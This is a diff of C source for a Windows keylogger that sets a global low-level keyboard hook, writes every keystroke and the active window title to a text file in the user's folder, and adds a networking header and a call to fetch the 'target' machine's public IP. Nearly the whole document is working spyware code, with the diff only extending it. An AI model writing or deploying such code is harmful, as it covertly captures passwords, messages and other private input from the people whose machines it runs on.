@@ -1,18 +1,20 @@
-#include <Windows.h>
-#include <stdio.h>
-#include <ctype.h>
-
+#include "stdafx.h"
 #include "klogger.h"
+#include "net.h"
 
+wchar_t kbtestfile[100];
 FILE* kbpFile;
+HHOOK kbhook;                                             // handle to keyboard hooking procedure
+
 HWND lastWindow;
 wchar_t lastWindowTitle[256];
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, INT iCmdShow)
 {
-	MSG msg;
-	
-	GetUserDirectory();
+	MSG msg;;
+
+	GetTargetUserDirectory(kbtestfile);
+	GetTargetPublicIp(kbpFile, kbtestfile);
 
 	if (!(kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)))
 		return 1;
@@ -24,7 +26,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLin
 	return 0;
 }
 
-void GetUserDirectory(void)
+void GetTargetUserDirectory(wchar_t kbtestfile[])
 {
 	wchar_t temp[] = L"C:\\Users\\%USERNAME%\\klog-test.txt";
 	ExpandEnvironmentStringsW(temp, kbtestfile, sizeof(temp));
@@ -38,8 +40,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 	wchar_t currentWindowTitle[256];
 	GetWindowTextW(currentWindow, currentWindowTitle, 256);
 
-	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256))
-	{
+	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256)) {
 		wchar_t output[256];
 		lastWindow = currentWindow;
 		wcsncpy_s(lastWindowTitle, 256, currentWindowTitle, sizeof(currentWindowTitle));
@@ -47,10 +48,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 		fputws(output, kbpFile);
 	}
 
-	if (code >= 0)
-	{
-		if (wParam == WM_KEYDOWN)
-		{
+	if (code >= 0) {
+		if (wParam == WM_KEYDOWN) {
 			PKBDLLHOOKSTRUCT kbhstruct = (PKBDLLHOOKSTRUCT)lParam;
 			DWORD vkey = kbhstruct->vkCode;
 			if (vkey == 0x01 || vkey == 0x02)
@@ -111,22 +110,18 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 			{
 				switch (vkey)
 				{
-				/*
 				case VK_CANCEL:
 					fputs("[ctrl+break]", kbpFile);
 					break;
-				*/
 				case VK_MBUTTON:
 					fputs("[middle-mouse]", kbpFile);
 					break;
-				/*
 				case VK_XBUTTON1:
 					fputs("[x1-mouse]", kbpFile);
 					break;
 				case VK_XBUTTON2:
 					fputs("[x2-mouse]", kbpFile);
 					break;
-				*/
 				case VK_BACK:
 					fputs("[back]", kbpFile);
 					break;
@@ -151,7 +146,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_CAPITAL:
 					fputs("[caps]", kbpFile);
 					break;
-				/*
 				case VK_KANA:
 					fputs("[kana/hangul mode]", kbpFile);
 					break;
@@ -164,7 +158,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_HANJA:
 					fputs("[kanji/hanja mode]", kbpFile);
 					break;
-				*/
 				case VK_ESCAPE:
 					fputs("[esc]", kbpFile);
 					break;
@@ -262,14 +255,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_RMENU:
 					fputs("[ralt]", kbpFile);
 					break;
-                                /*
+				/*
 				case VK_LSHIFT:
 					fputs("[lshift]", kbpFile);
 					break;
 				case VK_RSHIFT:
 					fputs("[rshift]", kbpFile);
 					break;
-                                */
+				*/
 				case VK_F1:
 					fputs("[f1]", kbpFile);
 					break;
